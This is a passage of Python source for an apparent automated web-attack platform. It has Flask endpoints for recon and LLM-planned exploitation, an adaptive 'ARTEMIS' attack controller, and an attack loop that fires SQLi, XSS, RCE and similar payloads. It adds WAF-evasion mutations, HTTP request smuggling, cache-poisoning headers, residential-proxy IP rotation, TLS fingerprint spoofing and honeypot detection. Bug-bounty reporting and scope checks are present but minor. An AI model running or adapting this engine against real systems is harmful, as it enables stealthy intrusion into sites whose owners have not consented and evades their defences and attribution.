                    if not ep.url.startswith("SDK:"):
                        results["all_endpoints"].append(ep_dict)

                    # Extract subdomains
                    if ep.type == "subdomain":
                        results["subdomains"].append(ep.url)

                log_event(
                    {
                        "type": "log",
                        "message": f"✅ ChatbotFinder: {len(endpoints)} endpoints found",
                        "level": "finding" if endpoints else "info",
                    }
                )

            except Exception as e:
                log_event(
                    {
                        "type": "log",
                        "message": f"⚠️ ChatbotFinder error: {e}",
                        "level": "warning",
                    }
                )

            # 2. IP Range Scanner (optional)
            if scan_ip_range:
                try:
                    from strike.recon.ip_range_scanner import IPRangeScanner

                    log_event(
                        {
                            "type": "log",
                            "message": f"🌐 IP Range Scanner starting...",
                            "level": "info",
                        }
                    )

                    scanner = IPRangeScanner(
                        timeout=10, scan_range=16, proxy_url=proxy_url
                    )
                    scan_result = await scanner.scan_domain(target)

                    for host in scan_result.hosts:
                        host_dict = {
                            "ip": host.ip,
                            "hostname": host.hostname,
                            "ports": host.ports,
                            "chat_endpoints": host.chat_endpoints,
                        }
                        results["ip_range_hosts"].append(host_dict)

                        # Add chat endpoints from IP scan
                        for ep in host.chat_endpoints:
                            results["all_endpoints"].append(
                                {
                                    "url": ep,
                                    "type": "ip_scan",
                                    "provider": None,
                                    "confidence": 0.7,
                                }
                            )

                    log_event(
                        {
                            "type": "log",
                            "message": f"✅ IP Range: {scan_result.hosts_found} hosts, "
                            f"{len(scan_result.chat_endpoints)} chat endpoints",
                            "level": "finding" if scan_result.hosts_found else "info",
                        }
                    )

                except Exception as e:
                    log_event(
                        {
                            "type": "log",
                            "message": f"⚠️ IP Range Scanner error: {e}",
                            "level": "warning",
                        }
                    )

            # Build summary
            results["summary"] = {
                "total_endpoints": len(results["all_endpoints"]),
                "chatbot_endpoints": len(results["chatbot_endpoints"]),
                "ip_hosts": len(results["ip_range_hosts"]),
                "subdomains": len(results["subdomains"]),
            }

            log_event(
                {
                    "type": "log",
                    "message": f'📊 Deep Recon complete: {results["summary"]["total_endpoints"]} endpoints',
                    "level": "finding",
                }
            )

            log_event({"type": "recon_complete", "data": results})

            return results

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(execute())
        finally:
            loop.close()

    # Run in background thread with SSE
    def run_recon_thread():
        global attack_running
        attack_running = True
        try:
            run_deep_recon()
        finally:
            attack_running = False
            log_event({"type": "done"})

    # Clear log queue
    while not attack_log.empty():
        try:
            attack_log.get_nowait()
        except:
            break

    thread = threading.Thread(target=run_recon_thread, daemon=True)
    thread.start()

    return jsonify(
        {"status": "started", "target": target, "scan_ip_range": scan_ip_range}
    )


# ============================================================================
# AI ANALYSIS ENDPOINTS
# ============================================================================


@app.route("/api/ai/analyze", methods=["POST"])
def ai_analyze():
    """
    AI-powered security analysis.

    Request body:
    {
        "findings": [...],
        "target_info": {"url": "...", "waf": "..."}
    }
    """
    if not LLM_AVAILABLE:
        return jsonify({"error": "LLM not available"}), 503

    try:
        data = request.get_json() or {}
        findings = data.get("findings", [])
        target_info = data.get("target_info", {})

        def run_analysis():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                llm = StrikeLLMManager()
                result = loop.run_until_complete(
                    llm.plan_exploitation(findings, target_info)
                )
                loop.run_until_complete(llm.close())
                return result
            finally:
                loop.close()

        result = run_analysis()
        return jsonify(result)

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/ai/waf-bypass", methods=["POST"])
def ai_waf_bypass():
    """
    AI-powered WAF bypass analysis.

    Request body:
    {
        "request": {"url": "...", "method": "GET", "payload": "..."},
        "response": {"status_code": 403, "headers": {...}, "body": "..."},
        "waf_type": "cloudflare"
    }
    """
    if not LLM_AVAILABLE:
        return jsonify({"error": "LLM not available"}), 503

    try:
        data = request.get_json() or {}
        request_info = data.get("request", {})
        response_info = data.get("response", {})
        waf_type = data.get("waf_type", "unknown")

        def run_analysis():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                llm = StrikeLLMManager()
                result = loop.run_until_complete(
                    llm.analyze_block(request_info, response_info, waf_type)
                )
                loop.run_until_complete(llm.close())
                return result
            finally:
                loop.close()

        result = run_analysis()
        return jsonify(result)

    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================================
# BUG BOUNTY ENDPOINTS
# ============================================================================


@app.route("/api/bugbounty/report", methods=["POST"])
def generate_bugbounty_report():
    """
    Generate bug bounty report from findings.

    Request body:
    {
        "program": "Example VDP",
        "target": "https://example.com",
        "findings": [
            {"title": "...", "severity": "Medium", "endpoint": "...", ...}
        ],
        "formats": ["md", "json", "html"]
    }
    """
    try:
        from strike.bugbounty import BugBountyReporter, Finding

        data = request.get_json() or {}
        program = data.get("program", "Security Assessment")
        target = data.get("target", "")
        findings_data = data.get("findings", [])
        formats = data.get("formats", ["md", "json"])

        reporter = BugBountyReporter(program, target)

        for f in findings_data:
            finding = Finding(
                title=f.get("title", "Untitled"),
                severity=f.get("severity", "Medium"),
                endpoint=f.get("endpoint", ""),
                parameter=f.get("parameter", ""),
                payload=f.get("payload", ""),
                response_evidence=f.get("evidence", ""),
                impact=f.get("impact", ""),
                remediation=f.get("remediation", ""),
                cwe_id=f.get("cwe_id"),
                owasp_category=f.get("owasp_category"),
            )
            reporter.add_finding(finding)

        # Generate reports
        report_dir = Path(__file__).parent.parent / "reports" / "api_generated"
        reporter.save(output_dir=str(report_dir), formats=formats)

        return jsonify(
            {
                "status": "success",
                "findings_count": len(reporter.findings),
                "severity_summary": reporter.get_severity_counts(),
                "report_dir": str(report_dir),
                "markdown_preview": reporter.generate_markdown()[:2000],
            }
        )

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/bugbounty/validate-scope", methods=["POST"])
def validate_scope():
    """
    Validate if target is in bug bounty scope.

    Request body:
    {
        "url": "https://example.com/api",
        "test_type": "sqli",
        "scope": {
            "in_scope_domains": ["*.example.com"],
            "out_of_scope_domains": ["admin.example.com"],
            "forbidden_tests": ["dos"]
        }
    }
    """
    try:
        from strike.bugbounty import BugBountyScope, ScopeValidator

        data = request.get_json() or {}
        url = data.get("url", "")
        test_type = data.get("test_type", "recon")
        scope_data = data.get("scope", {})

        scope = BugBountyScope(
            program_name=scope_data.get("program_name", "Test"),
            in_scope_domains=scope_data.get("in_scope_domains", []),
            out_of_scope_domains=scope_data.get("out_of_scope_domains", []),
            forbidden_tests=scope_data.get("forbidden_tests", []),
        )

        validator = ScopeValidator(scope)
        is_valid, reason = validator.validate_attack(url, test_type)

        return jsonify(
            {"url": url, "test_type": test_type, "in_scope": is_valid, "reason": reason}
        )

    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================================

# ATTACK ENGINE
# ============================================================================


def log_event(event: Dict):
    """Log event to both queue (UI) and file (analysis)."""
    attack_log.put(event)
    file_logger.log(event)


# ============================================================================
# ARTEMIS ADAPTIVE ATTACK LOGIC
# ============================================================================


class ARTEMISController:
    """
    ARTEMIS-style adaptive attack controller.

    When finding vulnerability → dig deeper with more variants
    When blocked → switch techniques and try different approaches
    """

    def __init__(self):
        # attack_type -> [techniques]
        self.successful_techniques: Dict[str, List] = {}
        # attack_type -> {blocked_techniques}
        self.blocked_techniques: Dict[str, set] = {}
        self.hot_payloads: List[Dict] = []  # Payloads that bypassed WAF
        # Payloads that found vulnerabilities
        self.findings_payloads: List[Dict] = []
        self.consecutive_blocks = 0
        self.max_deep_variants = 10
        # ARTEMIS Exhaustion Principle fields
        self.tested_vectors: set = set()
        self.required_vectors: set = set()

    def reset(self):
        """Reset controller for new attack."""
        self.successful_techniques = {}
        self.blocked_techniques = {}
        self.hot_payloads = []
        self.findings_payloads = []
        self.consecutive_blocks = 0
        self.tested_vectors = set()
        self.required_vectors = set()

    def record_bypass(
        self, attack_type: str, technique: str, payload: str, severity: str
    ):
        """Record successful bypass for reinforcement."""
        if attack_type not in self.successful_techniques:
            self.successful_techniques[attack_type] = []
        self.successful_techniques[attack_type].append(technique)
        self.hot_payloads.append(
            {
                "attack_type": attack_type,
                "technique": technique,
                "payload": payload,
                "severity": severity,
            }
        )
        self.consecutive_blocks = 0

    def record_finding(
        self, attack_type: str, technique: str, payload: str, finding: Dict
    ):
        """Record vulnerability finding - trigger deep exploitation."""
        self.findings_payloads.append(
            {
                "attack_type": attack_type,
                "technique": technique,
                "payload": payload,
                "finding": finding,
            }
        )
        log_event(
            {
                "type": "artemis",
                "action": "deep_exploit_triggered",
                "attack_type": attack_type,
                "technique": technique,
                "message": f"🎯 ARTEMIS: Deep exploitation triggered for {attack_type}",
            }
        )

    def record_block(self, attack_type: str, technique: str):
        """Record blocked attempt - may trigger technique switch."""
        if attack_type not in self.blocked_techniques:
            self.blocked_techniques[attack_type] = set()
        self.blocked_techniques[attack_type].add(technique)
        self.consecutive_blocks += 1

        if self.consecutive_blocks >= 5 and self.consecutive_blocks % 5 == 0:
            log_event(
                {
                    "type": "artemis",
                    "action": "technique_switch",
                    "message": f"⚡ ARTEMIS: {self.consecutive_blocks} consecutive blocks, switching",
                }
            )

    def get_deep_variants(
        self, waf_bypass, original_payload: str, count: int = 5
    ) -> List[str]:
        """Generate additional variants for deeper exploitation."""
        variants = []
        bypasses = waf_bypass.generate_bypasses(original_payload, count)
        variants.extend([b.bypassed for b in bypasses])

        # SQL-specific mutations
        mutations = [
            original_payload.replace("'", '"'),
            original_payload.replace("--", "#"),
            original_payload + " AND 1=1",
            "/**/" + original_payload,
            original_payload.replace(" ", "/**/"),
        ]
        variants.extend(mutations[:count])
        return variants[: self.max_deep_variants]

    def get_best_technique(self, attack_type: str, exclude: str = None) -> str:
        """Get best technique based on learning, excluding blocked ones."""
        all_techniques = [
            "HPP_GET",
            "HPP_POST",
            "HEADER_INJECT",
            "CHUNKED_POST",
            "MULTIPART",
            "POST_JSON",
            "CLTE_SMUGGLE",
            "TECL_SMUGGLE",
        ]
        blocked = self.blocked_techniques.get(attack_type, set())
        available = [t for t in all_techniques if t not in blocked and t != exclude]

        successful = self.successful_techniques.get(attack_type, [])
        if successful:
            from collections import Counter

            counts = Counter(successful)
            available.sort(key=lambda t: counts.get(t, 0), reverse=True)

        return available[0] if available else "HPP_GET"

    # ===================================================================
    # ARTEMIS Pattern 1: Adaptive Perseverance
    # If technique is blocked, respawn with different payload phrasing
    # ===================================================================
    def get_rephrased_payload(self, original: str, attempt: int) -> str:
        """Generate rephrased payload when original is blocked."""
        rephrasings = [
            lambda p: p.replace("'", "\\x27"),  # Hex encoding
            lambda p: p.replace(" ", "%20"),  # URL encoding
            lambda p: p.upper(),  # Case change
            lambda p: f"/**/{p}/**/",  # Comment wrapping
            lambda p: p.replace("OR", "||"),  # SQL operator change
            lambda p: p.replace("AND", "&&"),
            lambda p: f"{p}-- -",  # Alternative comment
            lambda p: p.replace("<", "&lt;"),  # HTML entities
        ]
        idx = attempt % len(rephrasings)
        return rephrasings[idx](original)

    # ===================================================================
    # ARTEMIS Pattern 2: Auto-Correction (Task Splitting)
    # Divide failing broad tasks into smaller focused chunks
    # ===================================================================
    def should_split_task(self, attack_type: str) -> bool:
        """Check if task should be split due to high failure rate."""
        blocked = len(self.blocked_techniques.get(attack_type, set()))
        successful = len(self.successful_techniques.get(attack_type, []))
        if blocked > 10 and successful == 0:
            return True
        return False

    def get_focused_params(self, param: str) -> List[str]:
        """Split broad param into focused sub-params."""
        # Common parameter variations
        return [
            param,
            f"{param}_id",
            f"user_{param}",
            f"{param}[]",
            f"search_{param}",
            f"filter[{param}]",
            f"{param}[0]",
        ]

    # ===================================================================
    # ARTEMIS Pattern 3: Technique Rotation (Fresh Perspective)
    # Switch technique pool on persistent failures
    # ===================================================================
    def rotate_technique_pool(self, attack_type: str) -> List[str]:
        """Get fresh technique pool when stuck."""
        # Secondary techniques not in primary pool
        secondary = [
            "CRLF_SPLIT",
            "UNICODE_NORM",
            "DOUBLE_ENCODE",
            "MIXED_CASE",
            "NULL_BYTE",
            "OVERLONG_UTF8",
        ]
        log_event(
            {
                "type": "artemis",
                "action": "technique_rotation",
                "message": f"🔄 ARTEMIS: Fresh technique pool for {attack_type}: {secondary[:3]}",
            }
        )
        return secondary

    # ===================================================================
    # ARTEMIS Pattern 4: Exhaustion Principle
    # Track tested vectors, don't stop until all exhausted
    # ===================================================================
    def __init__(self):
        self.successful_techniques: Dict[str, List] = {}
        self.blocked_techniques: Dict[str, set] = {}
        self.hot_payloads: List[Dict] = []
        self.findings_payloads: List[Dict] = []
        self.consecutive_blocks = 0
        self.max_deep_variants = 10
        self.tested_vectors: set = set()  # Track what was tested
        self.required_vectors: set = set()  # What must be tested

    def mark_vector_tested(self, vector: str, param: str):
        """Mark attack vector as tested."""
        self.tested_vectors.add(f"{vector}:{param}")

    def is_exhausted(self) -> bool:
        """Check if all required vectors have been tested."""
        if not self.required_vectors:
            return True
        return self.required_vectors.issubset(self.tested_vectors)

    def get_untested_vectors(self) -> List[str]:
        """Get list of vectors not yet tested."""
        return list(self.required_vectors - self.tested_vectors)

    def set_required_vectors(self, vectors: List[str], params: List[str]):
        """Set which vectors must be tested."""
        for v in vectors:
            for p in params:
                self.required_vectors.add(f"{v}:{p}")

    def get_exhaustion_summary(self) -> Dict:
        """Get exhaustion status summary."""
        return {
            "tested": len(self.tested_vectors),
            "required": len(self.required_vectors),
            "remaining": len(self.required_vectors - self.tested_vectors),
            "exhausted": self.is_exhausted(),
        }


# Global ARTEMIS controller
artemis = ARTEMISController()


def run_attack_thread(config):
    """Run attack in background thread."""
    try:
        print(f"[DEBUG] Attack thread started with config: {list(config.keys())}")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(execute_attack(config))
        loop.close()
        print("[DEBUG] Attack thread completed successfully")
    except Exception as e:
        print(f"[ERROR] Attack thread failed: {type(e).__name__}: {e}")
        import traceback

        traceback.print_exc()


async def execute_attack(config):
    """Execute attack with all engines."""
    global attack_running, attack_results

    target = config["target"]
    # Array of attack types
    attack_types = config.get("attack_types", ["sqli"])
    param = config.get("param", "id")
    max_payloads = config.get("max_payloads", 20)
    bypass_variants = config.get("bypass_variants", 3)

    # Enterprise config
    enterprise_cfg = config.get("enterprise", {})
    enterprise_enabled = enterprise_cfg.get("enabled", False)
    aggression = enterprise_cfg.get("aggression", 5)
    concurrent_agents = enterprise_cfg.get("concurrent_agents", 3)

    # Create semaphore for concurrent execution
    semaphore = asyncio.Semaphore(concurrent_agents)

    # === ARTEMIS: Reset controller for new attack ===
    artemis.reset()
    log_event(
        {
            "type": "artemis",
            "action": "init",
            "message": "🎯 ARTEMIS Adaptive Attack Controller initialized",
        }
    )

    # === ADAPTIVE RATE LIMITER: Initialize with base_delay ===
    from strike.bugbounty import AdaptiveRateLimiter

    initial_rps = (
        1.0 / config.get("base_delay", 1.0)
        if config.get("base_delay", 1.0) > 0
        else 10.0
    )
    rate_limiter = AdaptiveRateLimiter(
        initial_rps=initial_rps,
        min_rps=0.2,  # Max 5 second delay
        backoff_factor=0.5,  # Halve speed on rate limit
        consecutive_success_to_recover=5,
    )
    log_event(
        {
            "type": "log",
            "message": f"🚦 AdaptiveRateLimiter: {initial_rps:.1f} RPS",
            "level": "info",
        }
    )

    log_event(
        {
            "type": "log",
            "message": f"⚡ Concurrent Agents: {concurrent_agents}",
            "level": "info",
        }
    )
    burp_proxy = enterprise_cfg.get("burp_proxy")
    use_smuggling = enterprise_cfg.get("use_smuggling", False)

    # Initialize engines
    waf_bypass = WAFBypass()
    timing = HumanTiming(base_delay=config.get("base_delay", 1.0))
    block_detector = BlockDetector()
    geo_session = GeoStealthSession(urlparse(target).netloc)

    # Initialize enterprise bypass
    enterprise_bypass = None
    if enterprise_enabled:
        enterprise_bypass = create_enterprise_bypass(
            aggression=aggression, burp_proxy=burp_proxy
        )
        log_event(
            {
                "type": "log",
                "message": f"🔥 Enterprise Mode: Aggression {aggression}/10",
                "level": "attack",
            }
        )

    # === Initialize Residential Proxy for per-agent sessions ===
    residential_proxy = None
    scraperapi_key = enterprise_cfg.get("scraperapi_key", "")
    if scraperapi_key:
        residential_proxy = create_scraperapi_proxy(
            api_key=scraperapi_key, country=config.get("country", "us")
        )
        log_event(
            {
                "type": "log",
                "message": "🏠 Residential Proxy: ScraperAPI ENABLED",
                "level": "attack",
            }
        )
        log_event(
            {
                "type": "log",
                "message": f"🔄 Per-agent session rotation: {concurrent_agents} unique IPs",
                "level": "info",
            }
        )
        if use_smuggling and aggression >= 9:
            log_event(
                {
                    "type": "log",
                    "message": "⚠️ Request Smuggling ENABLED",
                    "level": "warning",
                }
            )

    # Initialize Ultimate Payload Mutator for Strange Math obfuscation
    payload_mutator = None
    if enterprise_enabled and aggression >= 7:
        payload_mutator = create_mutator(aggression=aggression)
        log_event(
            {
                "type": "log",
                "message": f"🧮 Strange Math Mutator: ENABLED (aggression {aggression})",
                "level": "attack",
            }
        )

    # === Initialize AI LLM Manager for intelligent attack planning ===
    llm_manager = None
    ai_enabled = config.get("ai_enabled", LLM_AVAILABLE)
    if ai_enabled and LLM_AVAILABLE:
        try:
            llm_manager = StrikeLLMManager()
            log_event(
                {
                    "type": "log",
                    "message": f"🧠 AI Attack Planner: {llm_manager.config.provider.value}/{llm_manager.config.model}",
                    "level": "attack",
                }
            )
        except Exception as e:
            log_event(
                {
                    "type": "log",
                    "message": f"⚠️ AI Manager unavailable: {e}",
                    "level": "warning",
                }
            )
            llm_manager = None

    # === Initialize AI Adaptive Engine for honeypot detection ===
    ai_adaptive_engine = None
    counter_deception = config.get("counter_deception", {})
    if counter_deception.get("ai_adaptive", False) and AI_ADAPTIVE_AVAILABLE:
        try:
            ai_adaptive_engine = AIAdaptiveEngine()
            log_event(
                {
                    "type": "log",
                    "message": "🤖 AI Adaptive: Honeypot detection ENABLED",
                    "level": "attack",
                }
            )
        except Exception as e:
            log_event(
                {
                    "type": "log",
                    "message": f"⚠️ AI Adaptive unavailable: {e}",
                    "level": "warning",
                }
            )
            ai_adaptive_engine = None

    # Get browser profile
    browser = config.get("browser", "chrome_win")

    if browser == "random":
        browsers = list(BrowserProfile)
        browser_profile = BrowserProfile.CHROME_WIN
    else:
        browser_profile = (
            BrowserProfile(browser)
            if browser in [b.value for b in BrowserProfile]
            else BrowserProfile.CHROME_WIN
        )

    stealth_config = StealthConfig(
        browser_profile=browser_profile,
        human_timing=config.get("stealth", {}).get("timing", True),
        timing_base_delay=config.get("base_delay", 1.0),
    )
    stealth_session = AdvancedStealthSession(stealth_config)

    # Set country
    country = config.get("country", "auto")
    if country != "auto" and country in ZOOGVPN_SERVERS:
        geo_session.current_country = country

    log_event({"type": "log", "message": f"🎯 Target: {target}", "level": "info"})
    log_event({"type": "fingerprint", "browser": browser_profile.value})
    log_event({"type": "geoswitch", "country": geo_session.current_country})
    log_event(
        {
            "type": "log",
            "message": f'🎯 Attack types: {", ".join(attack_types)}',
            "level": "info",
        }
    )

    # Get proxy
    proxy = geo_session.get_proxy()

    # Initialize curl_cffi for TLS fingerprint spoofing (Enterprise mode)
    curl_session = None
    if enterprise_enabled:
        try:
            from curl_cffi.requests import Session as CurlSession

            # Impersonate Chrome 120 for realistic TLS fingerprint
            curl_session = CurlSession(impersonate="chrome120")
            log_event(
                {
                    "type": "log",
                    "message": "🔐 TLS Fingerprint: Chrome 120 (curl_cffi)",
                    "level": "attack",
                }
            )
        except ImportError:
            log_event(
                {
                    "type": "log",
                    "message": "⚠️ curl_cffi not available, using aiohttp",
                    "level": "warning",
                }
            )

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=15)
    ) as session:
        # Iterate over each attack type
        for attack_type in attack_types:
            if not attack_running:
                break

            log_event(
                {
                    "type": "log",
                    "message": f"📦 Starting {attack_type.upper()}...",
                    "level": "info",
                }
            )

            # Get payloads for this attack type
            payloads = get_payloads_for_type(
                attack_type, config.get("custom_payload", "")
            )[:max_payloads]

            log_event(
                {
                    "type": "log",
                    "message": f"   {len(payloads)} payloads for {attack_type}",
                    "level": "info",
                }
            )

            for payload in payloads:
                if not attack_running:
                    break

                # Generate bypass variants
                variants = [payload]
                if bypass_variants > 0:
                    bypasses = waf_bypass.generate_bypasses(payload, bypass_variants)
                    variants.extend([b.bypassed for b in bypasses])

                # Add enterprise L4 bypasses if enabled
                enterprise_payloads = []
                if enterprise_bypass:
                    ent_bypasses = enterprise_bypass.generate_bypasses(
                        payload, param, count=bypass_variants
                    )
                    for ent in ent_bypasses:
                        # Store enterprise bypasses with metadata for special handling
                        enterprise_payloads.append(ent)

                # Apply Strange Math mutations for additional obfuscation
                if payload_mutator and len(variants) > 0:
                    mutated_variants = []
                    for v in variants:
                        # Apply random mutations to each variant
                        mutated = payload_mutator.mutate(v)
                        mutated_variants.append(mutated)
                    variants.extend(mutated_variants)

                # Filter all variants to be HTTP-safe (prevent latin-1 codec errors)
                safe_variants = []
                for v in variants:
                    try:
                        v.encode("latin-1")
                        safe_variants.append(v)
                    except UnicodeEncodeError:
                        # URL-encode non-ASCII characters
                        safe_v = []
                        for char in v:
                            try:
                                char.encode("latin-1")
                                safe_v.append(char)
                            except UnicodeEncodeError:
                                safe_v.append(quote(char))
                        safe_variants.append("".join(safe_v))
                variants = safe_variants

                # Process variants with controlled concurrency
                async def process_variant(
                    variant,
                    attack_type=attack_type,
                    ai_engine=ai_adaptive_engine,
                    res_proxy=residential_proxy,
                ):
                    """Process a single variant with semaphore-controlled concurrency."""
                    async with semaphore:
                        if not attack_running:
                            return

                        # Helper to route requests through ScraperAPI
                        def get_request_url(url: str) -> str:
                            if res_proxy:
                                api_url, _ = res_proxy.get_proxy_for_request(url)
                                return api_url
                            return url

                        # Get headers with HTTP-level bypass
                        headers = stealth_session.get_headers()
                        geo_headers = geo_session.get_headers()
                        headers.update(geo_headers)

                        # Add WAF bypass headers
                        bypass_headers = HTTPBypass.get_bypass_headers()
                        headers.update(bypass_headers)

                        # Enterprise bypass headers
                        if enterprise_bypass:
                            ent_headers = enterprise_bypass.get_bypass_headers()
                            headers.update(ent_headers)

                        # Elite bypass headers (WAF killer techniques)
                        if enterprise_enabled and aggression >= 7:
                            elite_techniques = ["websocket", "cache", "protocol"]
                            technique = elite_techniques[
                                hash(variant) % len(elite_techniques)
                            ]
                            elite_headers = EliteBypass.get_protocol_confusion_headers()
                            headers.update(elite_headers)

                            if aggression >= 8:
                                cache_headers = EliteBypass.get_cache_poisoning_headers(
                                    variant
                                )
                                headers.update(cache_headers)

                        # HTTP method strategy — ML-BASED ADAPTIVE SELECTION
                        http_methods = [
                            "GET",
                            "POST_FORM",
                            "POST_JSON",
                            "HPP_GET",
                            "HPP_POST",
                            "HEADER_INJECT",
                            "PUT_JSON",
                            "MULTIPART",
                            "CHUNKED_POST",
                            # Advanced smuggling methods
                            "CLTE_SMUGGLE",
                            "TECL_SMUGGLE",
                            "CRLF_SPLIT",
                        ]

                        # Map attack types to ML categories
                        category_map = {
                            "sqli": "SQLi",
                            "xss": "XSS",
                            "lfi": "LFI",
                            "cmdi": "CMDi",
                            "ssti": "SSTI",
                            "ssrf": "SSRF",
                            "xxe": "XXE",
                            "nosql": "NoSQLi",
                            "rce": "RCE",
                        }
                        ml_category = category_map.get(attack_type, "SQLi")

                        # Use ML selector for adaptive technique choice
                        if enterprise_enabled and aggression >= 6:
                            # Get ML prediction for best technique
                            predicted_technique = ml_selector.get_technique_for_payload(
                                variant, ml_category, waf_type="aws_waf"
                            )
                            # Map technique to HTTP method
                            technique_to_method = {
                                "hpp_get": "HPP_GET",
                                "hpp_post": "HPP_POST",
                                "header_inject": "HEADER_INJECT",
                                "chunked_post": "CHUNKED_POST",
                                "multipart": "MULTIPART",
                                "json_smuggling": "POST_JSON",
                                "clte_smuggling": "CLTE_SMUGGLE",
                                "tecl_smuggling": "TECL_SMUGGLE",
                                "crlf_injection": "CRLF_SPLIT",
                            }
                            method = technique_to_method.get(
                                predicted_technique, "HPP_GET"
                            )
                        else:
                            # Fallback to hash-based for lower aggression
                            method = http_methods[hash(variant) % len(http_methods)]

                        try:
                            target_url = f"{target}?{param}={quote(variant)}"

                            # Apply ScraperAPI proxy to both target and target_url
                            proxy_target = target
                            if residential_proxy:
                                target_url, _ = residential_proxy.get_proxy_for_request(
                                    target_url
                                )
                                proxy_target, _ = (
                                    residential_proxy.get_proxy_for_request(target)
                                )

                            # Start timing for honeypot detection
                            import time

                            request_start_time = time.time()

                            if curl_session:
                                loop = asyncio.get_event_loop()
                                if method == "GET":
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.get(
                                            target_url,
                                            headers=headers,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )
                                elif method == "POST_FORM":
                                    headers["Content-Type"] = (
                                        "application/x-www-form-urlencoded"
                                    )
                                    data = f"{param}={quote(variant)}"
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.post(
                                            proxy_target,
                                            headers=headers,
                                            data=data,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )
                                elif method == "POST_JSON":
                                    body, json_headers = HTTPBypass.get_json_smuggled(
                                        param, variant
                                    )
                                    headers.update(json_headers)
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.post(
                                            proxy_target,
                                            headers=headers,
                                            data=body,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )
                                elif method == "HPP_GET":
                                    hpp_variant = quote(variant)
                                    url = f"{proxy_target}?{param}=valid&{param}={hpp_variant}&{param}=safe"
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.get(
                                            url,
                                            headers=headers,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )
                                elif method == "HPP_POST":
                                    headers["Content-Type"] = (
                                        "application/x-www-form-urlencoded"
                                    )
                                    hpp_variant = quote(variant)
                                    data = f"{param}=normal&{param}={hpp_variant}&id=1"
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.post(
                                            proxy_target,
                                            headers=headers,
                                            data=data,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )
                                elif method == "HEADER_INJECT":
                                    headers["X-Forwarded-For"] = variant[:100]
                                    headers["X-Originating-IP"] = "127.0.0.1"
                                    headers["X-Client-IP"] = variant[:50]
                                    url = f"{proxy_target}?{param}=test"
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.get(
                                            url,
                                            headers=headers,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )
                                elif method == "PUT_JSON":
                                    body = (
                                        '{"'
                                        + param
                                        + '": "'
                                        + variant.replace('"', '\\"')
                                        + '"}'
                                    )
                                    headers["Content-Type"] = "application/json"
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.put(
                                            proxy_target,
                                            headers=headers,
                                            data=body,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )
                                elif method == "MULTIPART":
                                    import uuid

                                    boundary = (
                                        f"----WebKitFormBoundary{uuid.uuid4().hex[:16]}"
                                    )
                                    body = f'--{boundary}\r\nContent-Disposition: form-data; name="{param}"\r\n\r\n{variant}\r\n--{boundary}--\r\n'
                                    headers["Content-Type"] = (
                                        f"multipart/form-data; boundary={boundary}"
                                    )
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.post(
                                            proxy_target,
                                            headers=headers,
                                            data=body,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )
                                elif method == "CHUNKED_POST":
                                    chunk_size = len(variant) // 3 + 1
                                    chunks = [
                                        variant[i : i + chunk_size]
                                        for i in range(0, len(variant), chunk_size)
                                    ]
                                    chunked_body = ""
                                    for chunk in chunks:
                                        chunked_body += f"{len(chunk):X}\r\n{chunk}\r\n"
                                    chunked_body += "0\r\n\r\n"
                                    headers["Content-Type"] = "text/plain"
                                    headers["Transfer-Encoding"] = "chunked"
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.post(
                                            proxy_target,
                                            headers=headers,
                                            data=chunked_body,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )

                                # === ADVANCED SMUGGLING METHODS ===
                                elif method == "CLTE_SMUGGLE":
                                    # CL.TE smuggling - front-end uses Content-Length
                                    smuggle_result = smuggling.clte_basic(
                                        variant, urlparse(target).netloc
                                    )
                                    headers.update(smuggle_result.headers)
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.post(
                                            proxy_target,
                                            headers=headers,
                                            data=smuggle_result.body,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )
                                elif method == "TECL_SMUGGLE":
                                    # TE.CL smuggling - front-end uses Transfer-Encoding
                                    smuggle_result = smuggling.tecl_basic(
                                        variant, urlparse(target).netloc
                                    )
                                    headers.update(smuggle_result.headers)
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.post(
                                            proxy_target,
                                            headers=headers,
                                            data=smuggle_result.body,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )
                                elif method == "CRLF_SPLIT":
                                    # CRLF injection for request splitting
                                    smuggle_result = smuggling.crlf_splitting(variant)
                                    headers.update(smuggle_result.headers)
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.post(
                                            proxy_target,
                                            headers=headers,
                                            data=smuggle_result.body,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )
                                else:
                                    # Default fallback to GET
                                    url = f"{proxy_target}?{param}={quote(variant)}"
                                    resp = await loop.run_in_executor(
                                        None,
                                        lambda: curl_session.get(
                                            url,
                                            headers=headers,
                                            allow_redirects=False,
                                            timeout=15,
                                        ),
                                    )

                                log_event({"type": "request"})
                                response_time_ms = (
                                    time.time() - request_start_time
                                ) * 1000
                                content = resp.text
